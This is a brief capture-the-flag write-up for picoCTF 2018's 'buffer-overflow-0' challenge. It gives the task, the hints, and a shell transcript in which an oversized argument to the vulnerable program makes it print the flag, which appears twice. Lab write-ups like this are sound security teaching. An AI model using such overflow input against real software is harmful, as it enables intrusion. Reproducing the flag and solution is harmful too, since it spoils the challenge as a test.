:checkered_flag: picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c}

## Solve
Let's start off simple, can you overflow the right buffer in this [program](https://2018shell.picoctf.com/static/8ea6ca6c7edf2c50065e540c90207284/vuln) to get the flag? You can also find it in /problems/buffer-overflow-0_0_6461b382721ccca2318b1d981d363924 on the shell server. [Source](https://2018shell.picoctf.com/static/8ea6ca6c7edf2c50065e540c90207284/vuln.c).

## Hints
How can you trigger the flag to print?  
If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

## Solution
```
shoulderhu@pico-2018-shell:~$ cd  /problems/buffer-overflow-0_0_6461b382721ccca2318b1d981d363924
shoulderhu@pico-2018-shell:/problems/buffer-overflow-0_0_6461b382721ccca2318b1d981d363924$ ./vuln $(seq -s "" 19)
picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c}
```
